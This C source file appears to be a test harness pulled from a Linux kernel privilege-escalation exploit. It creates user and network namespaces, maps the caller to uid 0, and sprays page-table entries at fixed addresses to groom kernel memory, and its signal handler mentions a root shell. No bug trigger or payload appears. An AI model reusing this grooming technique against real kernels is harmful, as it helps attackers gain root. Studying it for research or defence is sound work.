#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>

#define CONFIG_PTE_SPRAY_AMOUNT 1024

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)

#define PTI_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, page_index) \
	((void *)(_pgd_index_to_virt((unsigned long long)(pgd_index)) + \
		  _pud_index_to_virt((unsigned long long)(pud_index)) + \
		  _pmd_index_to_virt((unsigned long long)(pmd_index)) + \
		  _pte_index_to_virt((unsigned long long)(pte_index)) + \
		  (unsigned long long)(page_index)))

void signal_handler_sleep(int sig)
{
	printf("[*] handling ctrl-c by sleeping backgorund thread\n");
	printf("!! >> if you did this while in the root shell, "
	       "the terminal will be messed up << !!\n");
	sleep(9999);
}

static void pin_cpu(int cpu_id)
{
	cpu_set_t mask;

	CPU_ZERO(&mask);
	CPU_SET(cpu_id, &mask);

	if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
		perror("sched_setaffinity");
		exit(1);
	}
}

/*
 * Origin:
 *   1. allocate a PUD (and a PMD+PTE) for PMD
 *     PGD1 > PUD0 > PMD0 > PTE0
 *   2. pre-allocate PMDs for sprayed PTEs
 *     PGD2 > PUD0 > PMD0 > PTE0 
 *     PGD2 > PUD1 > PMD0 > PTE0
 *   3. sparying 1024 pte's (PMD0-511 in same PMD page allocated in 2.)
 *     PGD2 > PUD0 > PMD0 > PTE0
 *     ...
 *     PGD2 > PUD0 > PMD511 > PTE0
 *     PGD2 > PUD1 > PMD0 > PTE0
 *     ...
 *     PGD2 > PUD1 > PMD511 > PTE0
 *   4. allocate PMD page  (PUD1 in the page already allocated in 1.)
 *     PGD1 > PUD1 > PMD0 > PTE0
 * Now:
 *   1. allocate a PUD (and a PMD+PTE) for PMD
 *     PGD0 > PUD1 > PMD0 > PTE0
 *   2. pre-allocate PMDs for sprayed PTEs
 *     PGD1 > PUD0 > PMD0 > PTE0 
 *     PGD1 > PUD1 > PMD0 > PTE0
 *   3. sparying 1024 pte's
 *     PGD1 > PUD0 > PMD0 > PTE0
 *     ...
 *     PGD1 > PUD0 > PMD511 > PTE0
 *     PGD1 > PUD1 > PMD0 > PTE0
 *     ...
 *     PGD1 > PUD1 > PMD511 > PTE0
 *   4. allocate PMD page
 *     PGD0 > PUD2 > PMD0 > PTE0
 */
static void alloc_pt_pages()
{
	void *_pmd_area, *pmd_kernel_area, *pmd_data_area;

	printf("[+] doing first useless allocs to setup caching and stuff...\n");

	pin_cpu(0);

	printf("[+] allocate a PUD (and a PMD+PTE) for PMD \n");
	mmap((void *)PTI_TO_VIRT(0, 1, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE,
	     MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long *)PTI_TO_VIRT(0, 1, 0, 0, 0) = 0xDEADBEEF;

	printf("[+] pre-register spray PTEs with 2 * 0x1000\n");
	// pre-register spray PTEs, with 2 * 0x1000.
	for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++) {
		void *retv = mmap((void *)PTI_TO_VIRT(1, 0, i, 0, 0), 0x2000,
				  PROT_READ | PROT_WRITE,
				  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
				  -1, 0);
		if (retv == MAP_FAILED) {
			perror("mmap");
			exit(EXIT_FAILURE);
		}
	}

	printf("[+] pre-allocate PMDS for sprayed PTEs\n");
	// pre-allocate PMDs for sprayed PTEs.
	for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char *)PTI_TO_VIRT(1, i, 0, 0, 0) = 0x41;

	printf("[+] allocate 2 PMD with 2*512*4096=0x400000\n");
	_pmd_area = mmap((void *)PTI_TO_VIRT(0, 2, 0, 0, 0), 0x40000,
			 PROT_READ | PROT_WRITE,
			 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

	printf("[+] allocated VMAs for process:\n" \
	       "  - pte_area: ?\n" \
	       "  - _pmd_area: %p\n", _pmd_area);

	printf("[+] spray-allocate the PTEs we simply access the virutal "
	       "memory pages in the VMA we registered earlier\n");
	// spray-allocate the PTEs from PCP allocator order-0 list
	// in order to spray PTEs we simply access the virtual memory pages
	// in the VMA we registered earlier.
	printf("[+] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
	// for (unsigned long long i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	// 	*(char *)PTI_TO_VIRT(1, 0, i, 0, 0) = 0x41;
	for (unsigned long long i = 0; i < 512; i++)
		*(char *)PTI_TO_VIRT(1, 0, i, 0, 0) = 0x41;
	for (unsigned long long i = 0; i < 512; i++)
		*(char *)PTI_TO_VIRT(1, 1, i, 0, 0) = 0x41;

	printf("[+] allocate PMD page\n");
	// allocate a PMD page.
	*(unsigned long long *)_pmd_area = 0xCAFEBABE;

	printf("[+] allocate PMD page done\n");

	return;
}

static void do_unshare()
{
	int retv;

	printf("[+] creating user namespace (CLONE_NEWUSER)...\n");
	retv = unshare(CLONE_NEWUSER);
	if (retv == -1) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	printf("[+] creating network namespace (CLONE_NEWNET)...\n");
	retv = unshare(CLONE_NEWNET);
	if (retv == -1) {
		perror("unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}
}

void write_file(const char *filename, const char *buf, size_t buflen,
		unsigned int flags)
{
	int fd;

	fd = open(filename, O_WRONLY | O_CREAT | flags, 0755);
	if (fd < 0) {
		perror("open$write_file");
		exit(EXIT_FAILURE);
	}

	if (write(fd, buf, buflen) != buflen) {
		perror("write$write_file");
		exit(EXIT_FAILURE);
	}

	close(fd);
}

static void configure_uid_map(uid_t old_uid, gid_t old_gid)
{
	char uid_map[128];
	char gid_map[128];

	printf("[+] setting up UID namespace...\n");

	sprintf(uid_map, "0 %d 1\n", old_uid);
	sprintf(gid_map, "0 %d 1\n", old_gid);

	printf("[+] mapping uid %d to namespace uid 0...\n", old_uid);
	write_file("/proc/self/uid_map", uid_map, strlen(uid_map), 0);

	printf("[+] deny namespace rights to set user groups...\n");
	write_file("/proc/self/setgroups", "deny", strlen("deny"), 0);

	printf("[+] mapping gid %d to namespace gid 0...\n", old_gid);
	write_file("/proc/self/gid_map", gid_map, strlen(gid_map), 0);
}

void setup_env()
{
	uid_t uid = getuid();
	gid_t gid = getgid();

	do_unshare();
	configure_uid_map(uid, gid);
}

// gcc alloc_ptpages.c -o test
int main()
{
	int *status;
	status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
		      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*status = 0;

	if (fork() == 0) {
		signal(SIGINT, signal_handler_sleep);
		setup_env();

		alloc_pt_pages();
		*status = 1;

		sleep(9999);
	}

	SPINLOCK(*status == 0);

	return 0;
}
